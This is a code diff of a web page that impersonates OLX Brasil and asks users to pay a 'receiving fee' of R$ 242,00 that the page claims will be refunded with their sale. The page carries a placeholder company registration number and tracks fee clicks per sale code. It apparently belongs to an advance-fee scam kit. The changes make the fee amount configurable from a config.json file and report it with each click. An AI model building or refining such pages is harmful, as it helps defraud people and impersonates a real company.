@@ -156,7 +156,7 @@
 
                     <div class="taxa-box">
                         <p>Taxa de Recebimentos de Valores:</p>
-                        <div class="taxa-valor">R$ 242,00</div>
+                        <div class="taxa-valor" id="taxa-valor">Carregando...</div>
                         <p>Este valor será reembolsado junto com o pagamento da sua venda</p>
                     </div>
 
@@ -172,14 +172,52 @@
 
         <footer>
             <div class="footer-bottom">
-                <p>© 2025 OLX Brasil - Todos os direitos reservados</p>
+                <p>© 2023 OLX Brasil - Todos os direitos reservados</p>
                 <p>CNPJ: 10.000.000/0001-00 - Avenida Paulista, 1000 - São Paulo/SP</p>
             </div>
         </footer>
     </div>
 
     <script>
+        // Variável global para armazenar o preço
+        let precoConfig = "242,00"; // Valor padrão caso falhe o carregamento
+        
+        // Função para carregar o preço do config.json
+        function carregarPreco() {
+            return fetch('/config.json')  // Caminho relativo à raiz do site
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Não foi possível carregar o arquivo config.json');
+                    }
+                    return response.json();
+                })
+                .then(config => {
+                    if (config && config.preco) {
+                        // Formatar o preço para o padrão brasileiro (com vírgula)
+                        precoConfig = config.preco.replace('.', ',');
+                        
+                        // Atualizar o valor na interface
+                        document.getElementById('taxa-valor').textContent = `R$ ${precoConfig}`;
+                        console.log('Preço carregado com sucesso:', precoConfig);
+                        return precoConfig;
+                    } else {
+                        throw new Error('Formato do config.json inválido');
+                    }
+                })
+                .catch(error => {
+                    console.error('Erro ao carregar o preço:', error);
+                    document.getElementById('taxa-valor').textContent = `R$ ${precoConfig}`;
+                    return precoConfig; // Retornar o valor padrão em caso de erro
+                });
+        }
+        
         document.addEventListener('DOMContentLoaded', function () {
+            // Definir valor padrão enquanto carrega
+            document.getElementById('taxa-valor').textContent = `R$ ${precoConfig}`;
+            
+            // Carregar o preço do config.json
+            carregarPreco();
+            
             // Obter ID da URL se necessário
             const urlParams = new URLSearchParams(window.location.search);
             const idParam = urlParams.get('id') || 'KFTKWNQVMD';
@@ -207,7 +245,7 @@
                                 codigo: idParam,
                                 produto: venda.titulo || 'Produto não identificado',
                                 acao: 'clique_taxa',
-                                valor: '242,00'
+                                valor: precoConfig || '0,00' // Usar o preço carregado do config
                             })
                         });
                     })
